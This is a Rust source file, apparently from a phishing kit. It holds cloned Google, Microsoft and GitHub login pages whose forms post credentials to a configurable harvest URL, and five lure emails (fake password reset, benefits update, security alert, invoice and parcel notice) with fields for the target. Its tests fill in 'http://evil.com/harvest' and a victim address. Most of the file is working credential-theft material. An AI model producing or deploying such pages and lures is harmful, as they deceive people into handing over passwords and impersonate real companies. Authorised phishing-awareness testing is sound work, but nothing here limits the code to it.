use std::collections::HashMap;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct LoginTemplate {
    pub name: String,
    pub brand: String,
    pub html: String,
    pub fields: Vec<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct PretextTemplate {
    pub name: String,
    pub scenario: String,
    pub tone: String,
    pub body: String,
}

pub struct TemplateEngine;

impl Default for TemplateEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl TemplateEngine {
    pub fn new() -> Self {
        TemplateEngine
    }

    pub fn generate_login_html(template: &LoginTemplate, harvest_url: &str) -> String {
        let mut html = template.html.clone();
        html = html.replace("{{HARVEST_URL}}", harvest_url);
        html
    }

    pub fn render_pretext(template: &PretextTemplate, replacements: &HashMap<String, String>) -> String {
        let mut body = template.body.clone();
        for (key, value) in replacements {
            body = body.replace(&format!("{{{{{}}}}}", key), value);
        }
        body
    }
}

pub fn get_login_templates() -> Vec<LoginTemplate> {
    vec![
        LoginTemplate {
            name: "Google".to_string(),
            brand: "google".to_string(),
            fields: vec!["email".to_string(), "passwd".to_string()],
            html: r#"<!DOCTYPE html><html><head><title>Google Sign-In</title><style>
body{font-family:arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}
.card{max-width:400px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.logo{text-align:center;margin-bottom:20px}
input{width:100%;padding:8px;margin:8px 0;border:1px solid #dadce0;border-radius:4px}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px}
</style></head><body><div class="card">
<div class="logo"><h1>Google</h1></div>
<form action="{{HARVEST_URL}}" method="POST">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="passwd" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>"#.to_string(),
        },
        LoginTemplate {
            name: "Office365".to_string(),
            brand: "microsoft".to_string(),
            fields: vec!["username".to_string(), "password".to_string()],
            html: r#"<!DOCTYPE html><html><head><title>Microsoft Sign In</title><style>
body{font-family:Segoe UI,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh}
.card{max-width:440px;padding:44px;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{margin-bottom:24px}
input{width:100%;padding:6px 10px;margin:4px 0 20px;border:none;border-bottom:1px solid #333}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px}
</style></head><body><div class="card">
<div class="logo"><h2>Microsoft</h2><p>Sign in</p></div>
<form action="{{HARVEST_URL}}" method="POST">
<label>Email or phone</label>
<input type="text" name="username" required>
<label>Password</label>
<input type="password" name="password" required>
<button type="submit">Sign in</button>
</form></div></body></html>"#.to_string(),
        },
        LoginTemplate {
            name: "GitHub".to_string(),
            brand: "github".to_string(),
            fields: vec!["login".to_string(), "password".to_string()],
            html: r#"<!DOCTYPE html><html><head><title>GitHub Login</title><style>
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f6f8fa;display:flex;justify-content:center;align-items:center;height:100vh}
.card{max-width:340px;padding:20px;background:#fff;border:1px solid #d0d7de;border-radius:6px}
input{width:100%;padding:5px 12px;margin:4px 0 16px;border:1px solid #d0d7de;border-radius:6px}
button{width:100%;padding:10px 16px;background:#2da44e;color:#fff;border:none;border-radius:6px}
</style></head><body><div class="card">
<h2>Sign in to GitHub</h2>
<form action="{{HARVEST_URL}}" method="POST">
<label>Username or email address</label>
<input type="text" name="login" required>
<label>Password</label>
<input type="password" name="password" required>
<button type="submit">Sign in</button>
</form></div></body></html>"#.to_string(),
        },
    ]
}

pub fn get_pretext_templates() -> Vec<PretextTemplate> {
    vec![
        PretextTemplate {
            name: "IT Support - Password Reset".to_string(),
            scenario: "IT support requesting password reset via link".to_string(),
            tone: "urgent".to_string(),
            body: "Dear {{TARGET}},\n\nThis is an automated notification from your IT Security Team.\n\nWe have detected unusual login activity on your account. To secure your access, please verify your credentials immediately.\n\nClick here to verify: {{LINK}}\n\nFailure to verify within 24 hours will result in account suspension.\n\nIT Security Department\n{{COMPANY}}".to_string(),
        },
        PretextTemplate {
            name: "HR - Updated Benefits".to_string(),
            scenario: "HR department announcing updated benefits package".to_string(),
            tone: "professional".to_string(),
            body: "Dear {{TARGET}},\n\nWe are pleased to announce the updated employee benefits package for {{YEAR}}. Please review the changes and confirm your elections.\n\nAccess your benefits portal: {{LINK}}\n\nBest regards,\nHuman Resources\n{{COMPANY}}".to_string(),
        },
        PretextTemplate {
            name: "Security Alert - Login Attempt".to_string(),
            scenario: "Security alert about a login attempt from unknown location".to_string(),
            tone: "alarming".to_string(),
            body: "Dear {{TARGET}},\n\nWe detected a sign-in attempt from {{LOCATION}} using IP address {{IP}}.\n\nIf this was you, you can ignore this message.\nIf not, please secure your account immediately: {{LINK}}\n\nAccount Security Team\n{{COMPANY}}".to_string(),
        },
        PretextTemplate {
            name: "Invoice - Payment Required".to_string(),
            scenario: "Fake invoice requiring immediate payment".to_string(),
            tone: "formal".to_string(),
            body: "To whom it may concern,\n\nPlease find attached invoice #{{INVOICE_NUM}} in the amount of ${{AMOUNT}} due on {{DUE_DATE}}.\n\nView invoice: {{LINK}}\n\nAccounts Payable\n{{COMPANY}}".to_string(),
        },
        PretextTemplate {
            name: "Package Delivery - Action Required".to_string(),
            scenario: "Undelivered package notification".to_string(),
            tone: "informative".to_string(),
            body: "Hi {{TARGET}},\n\nWe were unable to deliver your package scheduled for {{DATE}}. The delivery address may be incorrect.\n\nPlease confirm your delivery details here: {{LINK}}\n\nShipping Department\n{{CARRIER}}".to_string(),
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_login_templates() {
        let templates = get_login_templates();
        assert!(!templates.is_empty());
        assert!(templates.iter().any(|t| t.brand == "google"));
    }

    #[test]
    fn test_get_pretext_templates() {
        let templates = get_pretext_templates();
        assert!(!templates.is_empty());
    }

    #[test]
    fn test_generate_login_html() {
        let templates = get_login_templates();
        let html = TemplateEngine::generate_login_html(&templates[0], "http://evil.com/harvest");
        assert!(html.contains("http://evil.com/harvest"));
        assert!(!html.contains("{{HARVEST_URL}}"));
    }

    #[test]
    fn test_render_pretext() {
        let template = &get_pretext_templates()[0];
        let mut replacements = HashMap::new();
        replacements.insert("TARGET".to_string(), "victim@corp.com".to_string());
        replacements.insert("LINK".to_string(), "http://evil.com".to_string());
        replacements.insert("COMPANY".to_string(), "Acme Corp".to_string());
        let rendered = TemplateEngine::render_pretext(template, &replacements);
        assert!(rendered.contains("victim@corp.com"));
        assert!(rendered.contains("Acme Corp"));
        assert!(!rendered.contains("{{TARGET}}"));
    }

    #[test]
    fn test_login_template_serialize() {
        let t = LoginTemplate {
            name: "Test".to_string(),
            brand: "test".to_string(),
            fields: vec!["user".to_string()],
            html: "<html></html>".to_string(),
        };
        let json = serde_json::to_string_pretty(&t).unwrap();
        assert!(json.contains("Test"));
    }

    #[test]
    fn test_pretext_template_serialize() {
        let t = PretextTemplate {
            name: "Test".to_string(),
            scenario: "test scenario".to_string(),
            tone: "urgent".to_string(),
            body: "test body".to_string(),
        };
        let json = serde_json::to_string_pretty(&t).unwrap();
        assert!(json.contains("test scenario"));
    }
}
